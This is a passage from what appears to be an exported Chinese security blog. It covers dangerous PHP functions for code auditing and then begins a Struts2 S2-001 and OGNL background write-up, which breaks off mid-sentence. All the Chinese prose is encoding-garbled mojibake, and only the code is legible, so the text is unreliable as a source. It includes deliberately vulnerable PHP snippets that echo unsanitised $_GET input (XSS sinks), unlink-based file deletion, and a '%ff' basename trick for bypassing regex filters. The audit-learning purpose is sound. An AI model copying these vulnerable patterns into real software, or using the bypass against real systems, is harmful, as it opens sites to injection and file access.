é™¤å¤„åšé™åˆ¶ï¼Œé‚£ä¹ˆå°±å¯èƒ½ä¼šå¯¼è‡´ä»»æ„æ–‡ä»¶åˆ é™¤ï¼ˆç”šè‡³åˆ é™¤ç½‘ç«™æºç ï¼‰ã€‚ &lt;?php $file = \"demo.txt\"; if(unlink($file)){ echo(\"$file have been deleted\"); } else{ echo(\"$file not exist?\") } php&gt; session_destroy åœ¨äº†è§£è¿™ä¸ªå‡½æ•°ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦å…ˆäº†è§£ PHP sessionã€‚ PHP session å˜é‡ç”¨äºå­˜å‚¨å…³äºç”¨æˆ·ä¼šè¯çš„ä¿¡æ¯ã€‚ session_destroy()å‡½æ•°ç”¨æ¥é”€æ¯ä¸€ä¸ªä¼šè¯ä¸­çš„å…¨éƒ¨æ•°æ®ï¼Œä½†å¹¶ä¸ä¼šé‡ç½®å½“å‰ä¼šè¯æ‰€å…³è”çš„å…¨å±€å˜é‡ï¼ŒåŒæ—¶ä¹Ÿä¸ä¼šé‡ç½®ä¼šè¯ cookie XSS print &lt;?php $str = $_GET['x']; print($str); ?&gt; echo &lt;?php $str = $_GET['x']; echo \"$str\"; ?&gt; printf &lt;?php $number = 9; $str = \"Beijing\"; printf(\"There are %u million bicycles in %s.\",$number,$str); ?&gt; printf æ˜¯ä¸€ä¸ªæ ¼å¼åŒ–è¾“å‡ºå‡½æ•°ï¼Œç”¨äºæ ¹æ®æŒ‡å®šçš„æ ¼å¼å­—ç¬¦ä¸²è¾“å‡ºæ ¼å¼åŒ–çš„å­—ç¬¦ä¸²ã€‚ printf çš„è¯­æ³•æ˜¯ printf(format, arg1, arg2, ...)ï¼Œå…¶ä¸­ format æ˜¯æ ¼å¼å­—ç¬¦ä¸²ï¼Œarg1, arg2, ... æ˜¯è¦æ’å…¥åˆ°æ ¼å¼å­—ç¬¦ä¸²ä¸­çš„å€¼ã€‚ printf æ ¹æ®æ ¼å¼å­—ç¬¦ä¸²ä¸­çš„å ä½ç¬¦ % æ¥ç¡®å®šå¦‚ä½•æ ¼å¼åŒ–è¾“å‡ºã€‚ printf å¯ä»¥è¾“å‡ºæ ¼å¼åŒ–çš„å­—ç¬¦ä¸²ï¼Œä¾‹å¦‚å°†æ•°å­—æ ¼å¼åŒ–ä¸ºç‰¹å®šçš„ä½æ•°ã€æ§åˆ¶å°æ•°ç‚¹ç²¾åº¦ç­‰ã€‚ printf çš„è¿”å›å€¼æ˜¯è¾“å‡ºçš„å­—ç¬¦æ•°ã€‚ sprintf &lt;?php $str = $_GET['x']; $a = sprintf($str); echo \"$a\"; ?&gt; sprintf æ˜¯ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„å‡½æ•°ï¼Œç”¨äºæ ¹æ®æŒ‡å®šçš„æ ¼å¼å­—ç¬¦ä¸²ç”Ÿæˆæ ¼å¼åŒ–çš„å­—ç¬¦ä¸²ï¼Œè€Œä¸æ˜¯å°†å…¶ç›´æ¥è¾“å‡ºåˆ°å±å¹•ä¸Šã€‚ sprintf çš„è¯­æ³•æ˜¯ sprintf(format, arg1, arg2, ...)ï¼Œå…¶ä¸­ format æ˜¯æ ¼å¼å­—ç¬¦ä¸²ï¼Œarg1, arg2, ... æ˜¯è¦æ’å…¥åˆ°æ ¼å¼å­—ç¬¦ä¸²ä¸­çš„å€¼ã€‚ sprintf æ ¹æ®æ ¼å¼å­—ç¬¦ä¸²ä¸­çš„å ä½ç¬¦ % æ¥ç¡®å®šå¦‚ä½•æ ¼å¼åŒ–è¾“å‡ºã€‚ sprintf è¿”å›ä¸€ä¸ªæ ¼å¼åŒ–åçš„å­—ç¬¦ä¸²ï¼Œè€Œä¸æ˜¯ç›´æ¥è¾“å‡ºåˆ°å±å¹•ä¸Šã€‚ ä¸printfå‡½æ•°ç±»ä¼¼ï¼Œä½†printfå‡½æ•°æ˜¯ç›´æ¥å°†æ ¼å¼åŒ–åçš„å­—ç¬¦ä¸²ç›´æ¥è¾“å‡ºåˆ°å±å¹•ä¸Šï¼Œè€Œsprintfå‡½æ•°æ˜¯å°†æ ¼å¼åŒ–åçš„å­—ç¬¦ä¸²è¿”å›ï¼Œå¯ä»¥åœ¨å˜é‡ä¸­å­˜å‚¨ï¼Œç”¨äºåç»­çš„å¤„ç† die æ­¤å‡½æ•°è¾“å‡ºä¸€æ¡ä¿¡æ¯ï¼Œå¹¶é€€å‡ºå½“å‰è„šæœ¬ã€‚ &lt;?php $str = $_GET['x']; die($str); ?&gt; var_dump æ­¤å‡½æ•°æ‰“å°å˜é‡çš„ç›¸å…³ä¿¡æ¯ï¼Œç”¨æ¥æ˜¾ç¤ºå…³äºä¸€ä¸ªæˆ–å¤šä¸ªè¡¨è¾¾å¼çš„ç»“æ„ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¡¨è¾¾å¼çš„ç±»å‹ä¸å€¼ã€‚æ•°ç»„å°†é€’å½’å±•å¼€ä¹‹ï¼Œé€šè¿‡ç¼©è¿›æ˜¾ç¤ºå…¶ç»“æ„ã€‚ &lt;?php $str = $_GET['x']; $a = array($str); var_dump($a); ?&gt; var_export æ­¤å‡½æ•°è¾“å‡ºæˆ–è€…è¿”å›ä¸€ä¸ªå˜é‡çš„å­—ç¬¦ä¸²è¡¨ç¤ºã€‚å®ƒè¿”å›å…³äºä¼ é€’ç»™è¯¥å‡½æ•°çš„å˜é‡çš„ç»“æ„ä¿¡æ¯ï¼Œå’Œvar_dumpç±»ä¼¼ï¼Œä¸åŒçš„æ˜¯å…¶è¿”å›çš„è¡¨ç¤ºæ˜¯åˆæ³•çš„ PHP ä»£ç ã€‚ &lt;?php $str = $_GET['x']; $a = array($str); var_export($a); ?&gt; å…¶ä»–ç±»å‹ basename æ­¤å‡½æ•°è¿”å›è·¯å¾„ä¸­çš„æ–‡ä»¶åçš„ä¸€éƒ¨åˆ†(åé¢) basename(path,suffix) pathï¼šå¿…éœ€ã€‚è§„å®šè¦æ£€æŸ¥çš„è·¯å¾„ã€‚ suffixï¼šå¯é€‰ã€‚è§„å®šæ–‡ä»¶çš„æ‰©å±•åã€‚ &lt;?php $path = \"index.php/test.php\"; echo basename($path); ?&gt; æ‰§è¡Œç»“æœâ€”â€”&gt; test.php æ­¤å‡½æ•°è¿˜æœ‰ä¸€ä¸ªç‰¹ç‚¹ï¼Œå°±æ˜¯ä¼šå»æ‰æ–‡ä»¶åçš„éASCIIç å€¼ã€‚ &lt;?php $path = $_GET['x']; print_r(basename($path)); ?&gt; //é€šè¿‡ url ä¼ å…¥å‚æ•°`x=index.php/config.php/%ff` //ç»“æœï¼šå›æ˜¾config.php å¯ä»¥çœ‹åˆ°ï¼Œ%ffç›´æ¥æ²¡äº†ï¼Œè€Œæ˜¯ç›´æ¥è¾“å‡ºå‰é¢çš„çš„æ–‡ä»¶åï¼Œè¿™ä¸ªå¯ä»¥ç”¨æ¥ç»•è¿‡ä¸€äº›æ­£åˆ™åŒ¹é…ã€‚åŸå› å°±åœ¨äº%ffåœ¨é€šè¿‡ url ä¼ å‚æ—¶ä¼šè¢« url è§£ç ï¼Œè§£ç æˆäº†ä¸å¯è§å­—ç¬¦ï¼Œæ»¡è¶³äº†basenameå‡½æ•°å¯¹æ–‡ä»¶åçš„éASCIIå€¼å»é™¤çš„ç‰¹ç‚¹ï¼Œä»è€Œè¢«åˆ æ‰ã€‚ ç­‰PHPå®¡è®¡çš„æ—¶å€™åœ¨é‡åˆ°é—®é¢˜ï¼Œç»§ç»­è¡¥å……ã€‚ 0x03 å‚è€ƒæ–‡ç«  PHPä»£ç å®¡è®¡å±é™©å‡½æ•° PHPå‡½æ•°æ¼æ´æ€»ç»“ â€”â€”å«æœ‰æ–‡ä»¶åŒ…å«bypassï¼Œç»•è¿‡require_once å•æ¬¡åŒ…å«é™åˆ¶ https://github.com/hongriSec/PHP-Audit-Labs â€”â€”çº¢æ—¥ä»£ç å®¡è®¡é¶åœº preg_replace /e æ¨¡å¼ æ¼æ´åˆ†ææ€»ç»“ PHPä»£ç å®¡è®¡ä¹‹PHPå±é™©å‡½æ•°æ€»ç»“ æµ…è°ˆCTFä¸­å„ç§èŠ±å¼ç»•è¿‡çš„å°trick CTFâ€”â€”Webâ€”â€”php å¼±ç±»å‹æ€»ç»“ PHP CTFå¸¸è§è€ƒé¢˜çš„ç»•è¿‡æŠ€å·§ å…³äº CTF ä¸­ php è€ƒç‚¹ä¸ç»•è¿‡é‚£äº›äº‹çš„æ€»ç»“ PHP is_numeric()å‡½æ•°è¯¦è§£ï¼ŒPHPåˆ¤æ–­å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²ï¼Œis_numeric()ç»•è¿‡ å¦‚ä½•ä½¿ç”¨PHPè¯»å–æ–‡ä»¶çš„6ç§æ–¹æ³• phpå¸¸ç”¨çš„æ–‡ä»¶è¯»å–å‡½æ•°æ€»ç»“","tags":["webçŸ¥è¯†æ€»ç»“"],"categories":["webçŸ¥è¯†æ€»ç»“"]},{"title":"Javaååºåˆ—åŒ–å…¥é—¨ä¹‹S2-001åˆ†æ","path":"/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/","content":"0x01 å‰è¨€ è·Ÿç€å¸ˆå‚…çš„æŒ‡å¯¼ï¼Œå†æ¥çœ‹çœ‹Structs2çš„æ¼ï¼ˆæœ€è¿‘hvvä¹Ÿä¸€ç›´èƒŒçš„é¢ç»ï¼‰ã€‚æœ€è¿‘å­¦ä¹ è·¯ä¸Šæ€»æ˜¯emoï¼Œå‘ç°è‡ªå·±ä»¥å‰å­¦çš„ä¸æ‰å®ï¼Œè€Œä¸”ä¸²è”ä¸èµ·æ¥ï¼Œå¾ˆæ··ä¹±ï¼Œç›®å‰è¿˜æ²¡æ‰¾åˆ°è§£å†³çš„åŠæ³•ï¼Œåªèƒ½è¯´ï¼Œå…ˆè®¤çœŸå¯¹å¾…å½“ä¸‹çš„æ¯ä¸€æ¬¡æ‰€å­¦ä¹ çš„ä¸œè¥¿ã€‚æ—¥ååœ¨æ•´ç†ä¸€ä¸‹æ€ç»ªã€‚ 0x02 æ¦‚è¿° è‡ª Struts2 åœ¨ 2007 å¹´çˆ†å‡ºç¬¬ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ S2-001 ä»¥æ¥ï¼Œåœ¨å…¶åç»­çš„å‘å±•è¿‡ç¨‹ä¸­ä¸æ–­çˆ†å‡ºæ›´å¤šè€Œä¸”å±å®³æ›´å¤§çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œè€Œé€ æˆ Struts2 è¿™ä¹ˆå¤š RCE æ¼æ´çš„ä¸»è¦åŸå› å°±æ˜¯ OGNL è¡¨è¾¾å¼ã€‚è¿™é‡Œä»¥ Struts2 çš„ç¬¬ä¸€ä¸ªæ¼æ´ S2-001 ä¸ºä¾‹æ¥å¯¹ Struts2 è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´è¿›è¡Œå­¦ä¹  åœ¨è¿™ä¹‹å‰ï¼Œä¹Ÿæ˜¯ç®€å•è¿‡äº†ä¸€ä¸‹Java seç­‰åŸºç¡€ï¼Œå¸Œæœ›æ¥ä¸‹æ¥åˆ†æèƒ½å¤Ÿé¡ºåˆ©äº› 0x03 å‰ç½®çŸ¥è¯† OGNL ç®€ä»‹ é¦–å…ˆæ¥äº†è§£ OGNL è¡¨è¾¾å¼ï¼ŒOGNLï¼ˆObject Graphic Navigatino Languageï¼‰çš„ä¸­æ–‡å…¨ç§°ä¸ºâ€œå¯¹è±¡å›¾å¯¼èˆªè¯­è¨€â€ï¼Œæ˜¯åº”ç”¨äºJavaä¸­çš„ä¸€ä¸ªå¼€æºçš„åŠŸèƒ½å¼ºå¤§çš„è¡¨è¾¾å¼è¯­è¨€ï¼ˆExpression Languageï¼‰ï¼Œå®ƒè¢«é›†æˆåœ¨Struts2ç­‰æ¡†æ¶ä¸­ï¼Œé€šè¿‡ç®€å•ä¸€è‡´çš„è¡¨è¾¾å¼è¯­æ³•ï¼Œå¯ä»¥å­˜å–å¯¹è±¡çš„ä»»ä½•å±æ€§ï¼Œè°ƒç”¨å¯¹è±¡çš„æ–¹æ³•ï¼Œéå†æ•´ä¸ªå¯¹è±¡çš„ç»“æ„å›¾ï¼Œå®ç°å­—æ®µç±»å‹è½¬åŒ–ç­‰åŠŸèƒ½ã€‚ OGNLè¿›è¡Œå¯¹è±¡å­˜å–æ“ä½œçš„APIåœ¨Ognl.javaæ–‡ä»¶ä¸­ï¼Œåˆ†åˆ«æ˜¯getValueã€setValueä¸¤ä¸ªæ–¹æ³•ã€‚getValueé€šè¿‡ä¼ å…¥çš„OGNLè¡¨è¾¾å¼ï¼Œåœ¨ç»™å®šçš„ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­ï¼Œä»rootå¯¹è±¡é‡Œå–å€¼ï¼š åˆ›å»ºä¸€ä¸ªStudentç±» public class Student { private String name; private String StudentNumber; private TheClass theClass; public String getName() { return name; } public void setName(String name) { this.name = name; } public String getStudentNumber() { return StudentNumber; } public void setStudentNumber(String studentNumber) { StudentNumber = studentNumber; } public TheClass getTheClass() { return theClass; } public void setTheClass(TheClass theClass) { this.theClass = theClass; } } å®šä¹‰ä¸€ä¸ªSchoolç±» public class School { private String schoolName; public String getSchoolName() { return schoolName; } public void setSchoolName(String schoolName) { this.schoolName = schoolName; } } æœ€åä¸€ä¸ªTheClassç±» public class TheClass { private String className; private School school; public String getClassName() { return className; } public void setClassName(String className) { this.className = className; } public School getSchool() { return school; } public void setSchool(School school) { this.school = school; } } åˆ†åˆ«å®šä¹‰ç›¸åº”çš„å±æ€§ï¼Œå¹¶è®¾ç½®getã€setæ–¹æ³• ä¹‹åæ·»åŠ ognl jaråŒ…ä½œä¸ºç›¸åº”çš„åº“ï¼Œéšååœ¨å®šä¹‰ä¸€ä¸ªTestOgnlç±» import ognl.Ognl; import ognl.OgnlException; public class TestOgnl { public static void main(String[] args) throws OgnlException { Student student = new Student(); TheClass theClass = new TheClass(); School school = new School(); school.setSchoolName(\"ä¸€ä¸­\"); theClass.setSchool(school); theClass.setClassName(\"ä¸‰ç­\"); student.setName(\"hybcx\"); student.setStudentNumber(\"003\"); student.setTheClass(theClass); String schoolName = (String) Ognl.getValue(\"#root.theClass.school.schoolName\", student); System.out.println(schoolName); } } åˆ†åˆ«ç»™å¯¹åº”çš„å±æ€§èµ‹å€¼ï¼Œæ¥ç€æˆ‘ä»¬æ˜¯æƒ³è¦è·å–åˆ°å…¶ä¸­çš„schoolNameå±æ€§å€¼ æˆ‘ä»¬å¯ä»¥ä¸ä¼ ç»Ÿçš„æ–¹æ³•æ¯”è¾ƒä¸€ä¸‹ï¼Œå¦‚æœæƒ³è¦è·å–schoolNameå±æ€§å€¼ï¼Œå°±éœ€è¦å®ä¾‹åŒ–å¯¹åº”ç±»ï¼Œç„¶åè°ƒç”¨getæ–¹æ³•ã€‚ä½†å¦‚æœä½¿ç”¨ognlçš„getValueæ–¹æ³•ï¼Œå°±åªéœ€è¦ä¼ é€’ä¸€ä¸ªognlè¡¨è¾¾å¼å’Œæ ¹èŠ‚ç‚¹å°±èƒ½å–å‡ºæŒ‡å®šå¯¹è±¡çš„å±æ€§å€¼ã€‚ OGNL ä¸‰è¦ç´  OGNLå…·æœ‰ä¸‰è¦ç´ ï¼šè¡¨è¾¾å¼ï¼ˆexpressionï¼‰ã€æ ¹å¯¹è±¡ï¼ˆrootï¼‰å’Œä¸Šä¸‹æ–‡å¯¹è±¡ï¼ˆcontextï¼‰ã€‚ è¡¨è¾¾å¼ï¼ˆexpressionï¼‰ï¼šè¡¨è¾¾å¼æ˜¯æ•´ä¸ªOGNLçš„æ ¸å¿ƒï¼Œé€šè¿‡è¡¨è¾¾å¼æ¥å‘Šè¯‰OGNLéœ€è¦æ‰§è¡Œä»€ä¹ˆæ“ä½œï¼› æ ¹å¯¹è±¡ï¼ˆrootï¼‰ï¼šrootå¯ä»¥ç†è§£ä¸ºOGNLçš„æ“ä½œå¯¹è±¡ï¼ŒOGNLå¯ä»¥å¯¹rootè¿›è¡Œå–å€¼æˆ–å†™å€¼ç­‰æ“ä½œï¼Œè¡¨è¾¾å¼è§„å®šäº†â€œåšä»€ä¹ˆâ€ï¼Œè€Œæ ¹å¯¹è±¡åˆ™è§„å®šäº†â€œå¯¹è°æ“ä½œâ€ã€‚å®é™…ä¸Šæ ¹å¯¹è±¡æ‰€åœ¨çš„ç¯å¢ƒå°±æ˜¯ OGNL çš„ä¸Šä¸‹æ–‡å¯¹è±¡ç¯å¢ƒï¼› ä¸Šä¸‹æ–‡å¯¹è±¡ï¼ˆcontextï¼‰ï¼šcontextå¯ä»¥ç†è§£ä¸ºå¯¹è±¡è¿è¡Œçš„ä¸Šä¸‹æ–‡ç¯å¢ƒï¼Œcontextä»¥MAPçš„ç»“æ„ã€åˆ©ç”¨é”®å€¼å¯¹å…³ç³»æ¥æè¿°å¯¹è±¡ä¸­çš„å±æ€§ä»¥åŠå€¼ï¼› è¿™æ ·ä¸éš¾çŸ¥é“ï¼ŒOGNLçš„contextæ˜¯åŒ…å«rootçš„ã€‚ Struts2ä¸­çš„ActionContextå³ä¸ºOGNLçš„contextï¼ˆåˆç§°context mapï¼‰ï¼Œå…¶ä¸­åŒ…å«çš„ValueStackå³ä¸ºOGNLçš„rootã€‚è¯¥ActionContextåŒ…å«çš„å¯¹è±¡å¦‚å›¾ï¼š ValueStack å€¼æ ˆï¼ˆValueStackï¼‰å°±æ˜¯OGNLè¡¨è¾¾å¼å­˜å–æ•°æ®çš„åœ°æ–¹ã€‚åœ¨ä¸€ä¸ªå€¼æ ˆä¸­ï¼Œå°è£…äº†ä¸€æ¬¡è¯·æ±‚æ‰€éœ€è¦çš„æ‰€æœ‰æ•°æ®ã€‚ åœ¨ä½¿ç”¨Struts2çš„é¡¹ç›®ä¸­ï¼ŒStruts2ä¼šä¸ºæ¯ä¸ªè¯·æ±‚åˆ›å»ºä¸€ä¸ªæ–°çš„å€¼æ ˆï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå€¼æ ˆå’Œè¯·æ±‚æ˜¯ä¸€ä¸€å¯¹åº”çš„å…³ç³»ï¼Œè¿™ç§ä¸€ä¸€å¯¹åº”çš„å…³ç³»ä½¿å€¼æ ˆèƒ½å¤Ÿçº¿ç¨‹å®‰å…¨åœ°ä¸ºæ¯ä¸ªè¯·æ±‚æä¾›å…¬å…±çš„æ•°æ®å­˜å–æœåŠ¡ã€‚ å€¼æ ˆçš„ä½œç”¨ å€¼æ ˆå¯ä»¥ä½œä¸ºä¸€ä¸ªæ•°æ®ä¸­è½¬ç«™åœ¨å‰å°ä¸åå°ä¹‹é—´ä¼ é€’æ•°æ®ï¼Œæœ€å¸¸è§çš„å°±æ˜¯å°†Struts2çš„æ ‡ç­¾ä¸OGNLè¡¨è¾¾å¼ç»“åˆä½¿ç”¨ã€‚å€¼æ ˆå®é™…ä¸Šæ˜¯ä¸€ä¸ªæ¥å£ï¼Œåœ¨Struts2ä¸­åˆ©ç”¨OGNLæ—¶ï¼Œå®é™…ä¸Šä½¿ç”¨çš„å°±æ˜¯å®ç°äº†è¯¥æ¥å£çš„OgnlValueStackç±»ï¼Œè¿™ä¸ªç±»æ˜¯OGNLçš„åŸºç¡€ã€‚ å€¼æ ˆè´¯ç©¿æ•´ä¸ªActionçš„ç”Ÿå‘½å‘¨æœŸï¼Œæ¯ä¸ªActionç±»çš„å¯¹è±¡å®ä¾‹éƒ½æ‹¥æœ‰ä¸€ä¸ªValueStackå¯¹è±¡ï¼Œåœ¨ValueStackå¯¹è±¡ä¸­ä¿å­˜äº†å½“å‰Actionå¯¹è±¡å’Œå…¶ä»–ç›¸å…³å¯¹è±¡ã€‚ è¦è·å–å€¼æ ˆä¸­å­˜å‚¨çš„æ•°æ®ï¼Œé¦–å…ˆåº”è¯¥è·å–å€¼æ ˆã€‚å€¼æ ˆçš„è·å–æœ‰ä¸¤ç§æ–¹å¼ï¼Œå…·ä½“å¦‚ä¸‹ã€‚ requestä¸­è·å–å€¼æ ˆ ValueStackå¯¹è±¡åœ¨requestèŒƒå›´å†…çš„å­˜å‚¨æ–¹å¼ä¸ºrequest.setAttribute(\"struts.valueStack\",valuestack)ï¼Œå¯ä»¥é€šè¿‡å¦‚ä¸‹æ–¹å¼ä»requestä¸­å–å‡ºå€¼æ ˆçš„ä¿¡æ¯ã€‚ //è·å– ValueStack å¯¹è±¡ï¼Œé€šè¿‡ request å¯¹è±¡è·å– ValueStack valueStack = (ValueStack)ServletActionContext.getRequest() .getAttribute(ServletActionContext.STRUTS_VALUESTACK_KEY); åœ¨ä¸Šè¿°ç¤ºä¾‹ä»£ç ä¸­ï¼ŒServletActionContext.STRUTS_VALUESTACK_KEYæ˜¯ServletActionContextç±»ä¸­çš„å¸¸é‡ï¼Œå®ƒçš„å€¼ä¸ºstruts.valueStackã€‚ ActionContextä¸­è·å–å€¼æ ˆ åœ¨ä½¿ç”¨Struts2æ¡†æ¶æ—¶ï¼Œå¯ä»¥ä½¿ç”¨OGNLæ“ä½œContextå¯¹è±¡ä»ValueStackä¸­å­˜å–æ•°æ®ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¯ä»¥ä»Contextå¯¹è±¡ä¸­è·å–ValueStackå¯¹è±¡ã€‚å®é™…ä¸Šï¼ŒStruts2æ¡†æ¶ä¸­çš„Contextå¯¹è±¡å°±æ˜¯ActionContextã€‚ ActionContextè·å–ValueStackå¯¹è±¡çš„æ–¹å¼å¦‚ä¸‹æ‰€ç¤ºï¼š //é€šè¿‡ ActionContext è·å– valueStack å¯¹è±¡ ValueStack valueStack = ActionContext.getContext().getValueStack(); ActionContextå¯¹è±¡æ˜¯åœ¨StrutsPrepareAndExcuteFilterçš„doFilter()æ–¹æ³•ä¸­è¢«åˆ›å»ºçš„ï¼Œåœ¨æºç ä¸­ç”¨äºåˆ›å»ºActionContextå¯¹è±¡çš„createActionContext()æ–¹æ³•å†…å¯ä»¥æ‰¾åˆ°è·å–çš„ValueStackå¯¹è±¡çš„ä¿¡æ¯ã€‚ æ–¹æ³•ä¸­è¿˜æœ‰è¿™æ ·ä¸€æ®µä»£ç ï¼š ctx = new ActionContext(stack.getContext()); ä»ä¸Šè¿°ä»£ç ä¸­å¯ä»¥çœ‹å‡ºï¼ŒValueStackå¯¹è±¡ä¸­çš„Contextå¯¹è±¡è¢«ä½œä¸ºå‚æ•°ä¼ é€’ç»™äº†ActionContextå¯¹è±¡ï¼Œè¿™ä¹Ÿå°±è¯´æ˜ActionContextå¯¹è±¡ä¸­æŒæœ‰äº†ValueStackå¯¹è±¡çš„å¼•ç”¨ï¼Œå› æ­¤å¯ä»¥é€šè¿‡ActionContextå¯¹è±¡è·å–ValueStackå¯¹è±¡ã€‚ Struts2 æ‰§è¡Œæµç¨‹ é¦–å…ˆæ¥ç®€å•äº†è§£ Struts2 çš„æ‰§è¡Œæµç¨‹ã€‚å®˜æ–¹æä¾›çš„ Struts2 çš„æ¶æ„å¦‚å›¾ï¼š åœ¨è¯¥å›¾ä¸­ï¼Œä¸€å…±ç»™å‡ºäº†å››ç§é¢œè‰²çš„æ ‡è¯†ï¼Œå…¶å¯¹åº”çš„æ„ä¹‰å¦‚ä¸‹ã€‚ Servlet Filters(æ©™è‰²)ï¼šè¿‡æ»¤å™¨ï¼Œæ‰€æœ‰çš„è¯·æ±‚éƒ½è¦ç»è¿‡è¿‡æ»¤å™¨çš„å¤„ç†ã€‚ Struts Core(æµ…è“è‰²)ï¼šStruts2çš„æ ¸å¿ƒéƒ¨åˆ†ã€‚ Interceptors(æµ…ç»¿è‰²)ï¼šStruts2çš„æ‹¦æˆªå™¨ã€‚ User created(æµ…é»„è‰²)ï¼šéœ€è¦å¼€å‘äººå‘˜åˆ›å»ºçš„éƒ¨åˆ†ã€‚ å›¾ä¸­çš„ä¸€äº›ç»„ä»¶çš„ä½œç”¨å¦‚ä¸‹ï¼š FilterDispatcherï¼šæ˜¯æ•´ä¸ªStruts2çš„è°ƒåº¦ä¸­å¿ƒï¼Œä¹Ÿå°±æ˜¯æ•´ä¸ªMVCæ¶æ„ä¸­çš„Cï¼Œå®ƒæ ¹æ®ActionMapperçš„ç»“æœæ¥å†³å®šæ˜¯å¦å¤„ç†è¯·æ±‚ã€‚ ActionMapperï¼šç”¨æ¥åˆ¤æ–­ä¼ å…¥çš„è¯·æ±‚æ˜¯å¦è¢«Struts2å¤„ç†ï¼Œå¦‚æœéœ€è¦å¤„ç†çš„è¯ï¼ŒActionMapperå°±ä¼šè¿”å›ä¸€ä¸ªå¯¹è±¡æ¥æè¿°è¯·æ±‚å¯¹åº”çš„ActionInvocationçš„ä¿¡æ¯ã€‚ ActionProxyï¼šç”¨æ¥åˆ›å»ºä¸€ä¸ªActionInvocationä»£ç†å®ä¾‹ï¼Œå®ƒä½äºActionå’Œxworkä¹‹é—´ã€‚ ConfigurationManagerï¼šæ˜¯xworké…ç½®çš„ç®¡ç†ä¸­å¿ƒï¼Œå¯ä»¥æŠŠå®ƒå½“åšå·²ç»è¯»å–åˆ°å†…å­˜ä¸­çš„struts.xmlé…ç½®æ–‡ä»¶ã€‚ struts.xmlï¼šæ˜¯Stuts2çš„åº”ç”¨é…ç½®æ–‡ä»¶ï¼Œè´Ÿè´£è¯¸å¦‚URLä¸Actionä¹‹é—´æ˜ å°„çš„é…ç½®ã€ä»¥åŠæ‰§è¡Œåé¡µé¢è·³è½¬çš„Resulté…ç½®ç­‰ã€‚ ActionInvocationï¼šç”¨æ¥çœŸæ­£çš„è°ƒç”¨å¹¶æ‰§è¡ŒActionã€æ‹¦æˆªå™¨å’Œå¯¹åº”çš„Resultï¼Œä½œç”¨ç±»ä¼¼äºä¸€ä¸ªè°ƒåº¦å™¨ã€‚ Interceptorï¼šæ‹¦æˆªå™¨ï¼Œå¯ä»¥è‡ªåŠ¨æ‹¦æˆªActionï¼Œä¸»è¦åœ¨Actionè¿è¡Œä¹‹å‰æˆ–è€…Resultè¿è¡Œä¹‹åæ¥è¿›è¡Œæ‰§è¡Œï¼Œå¼€å‘è€…å¯ä»¥è‡ªå®šä¹‰ã€‚ Actionï¼šæ˜¯Struts2ä¸­çš„åŠ¨ä½œæ‰§è¡Œå•å…ƒã€‚ç”¨æ¥å¤„ç†ç”¨æˆ·è¯·æ±‚ï¼Œå¹¶å°è£…ä¸šåŠ¡æ‰€éœ€è¦çš„æ•°æ®ã€‚ Resultï¼šæ˜¯ä¸åŒè§†å›¾ç±»å‹çš„æŠ½è±¡å°è£…æ¨¡å‹ï¼Œä¸åŒçš„è§†å›¾ç±»å‹ä¼šå¯¹åº”ä¸åŒçš„Resultå®ç°ï¼ŒStruts2ä¸­æ”¯æŒå¤šç§è§†å›¾ç±»å‹ï¼Œæ¯”å¦‚Jspï¼ŒFreeMarkerç­‰ã€‚ Templatesï¼šå„ç§è§†å›¾ç±»å‹çš„é¡µé¢æ¨¡æ¿ï¼Œæ¯”å¦‚JSPå°±æ˜¯ä¸€ç§æ¨¡æ¿é¡µé¢æŠ€æœ¯ã€‚ Tag Subsystemï¼šStruts2çš„æ ‡ç­¾åº“ï¼Œå®ƒæŠ½è±¡äº†ä¸‰ç§ä¸åŒçš„è§†å›¾æŠ€æœ¯JSPã€velocityã€freemarkerï¼Œå¯ä»¥åœ¨ä¸åŒçš„è§†å›¾æŠ€æœ¯ä¸­ï¼Œå‡ ä¹æ²¡æœ‰å·®åˆ«çš„ä½¿ç”¨è¿™äº›æ ‡ç­¾ã€‚ æ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥ç»“åˆä¸Šå›¾ï¼Œæ¥äº†è§£ä¸‹Struts2æ¡†æ¶æ˜¯å¦‚ä½•å¤„ç†ä¸€ä¸ªHTTPè¯·æ±‚çš„ã€‚ å½“HTTPè¯·æ±‚å‘é€åˆ°WebæœåŠ¡å™¨ä¹‹åï¼ŒWebæœåŠ¡å™¨æ ¹æ®ç”¨æˆ·çš„è¯·æ±‚ä»¥åŠweb.xmlä¸­çš„é…ç½®æ–‡ä»¶ï¼Œå°†è¯·æ±‚è½¬å‘ç»™Struts2æ¡†æ¶è¿›è¡Œå¤„ç†ã€‚ HTTPè¯·æ±‚ç»è¿‡ä¸€ç³»åˆ—çš„è¿‡æ»¤å™¨ï¼Œæœ€ååˆ°è¾¾FilterDispatcherè¿‡æ»¤å™¨ã€‚ FilterDispatcherå°†è¯·æ±‚è½¬å‘ç»™ActionMapperï¼Œåˆ¤æ–­è¯¥è¯·æ±‚æ˜¯å¦éœ€è¦å¤„ç†ã€‚ å¦‚æœè¯¥è¯·æ±‚éœ€è¦å¤„ç†ï¼ŒFilterDispatcherä¼šåˆ›å»ºä¸€ä¸ªActionProxyæ¥è¿›è¡Œåç»­çš„å¤„ç†ã€‚ ActionProxyæ‹¿ç€HTTPè¯·æ±‚ï¼Œè¯¢é—®struts.xmlè¯¥è°ƒç”¨å“ªä¸€ä¸ªActionè¿›è¡Œå¤„ç†ã€‚ å½“çŸ¥é“ç›®æ ‡Actionä¹‹åï¼Œå®ä¾‹åŒ–ä¸€ä¸ªActionInvocationæ¥è¿›è¡Œè°ƒç”¨ã€‚ ç„¶åè¿è¡Œåœ¨Actionä¹‹å‰çš„æ‹¦æˆªå™¨ï¼Œå›¾ä¸­å°±æ˜¯æ‹¦æˆªå™¨1ã€2ã€3ã€‚ è¿è¡ŒActionï¼Œç”Ÿæˆä¸€ä¸ªResultã€‚ Resultæ ¹æ®é¡µé¢æ¨¡æ¿å’Œæ 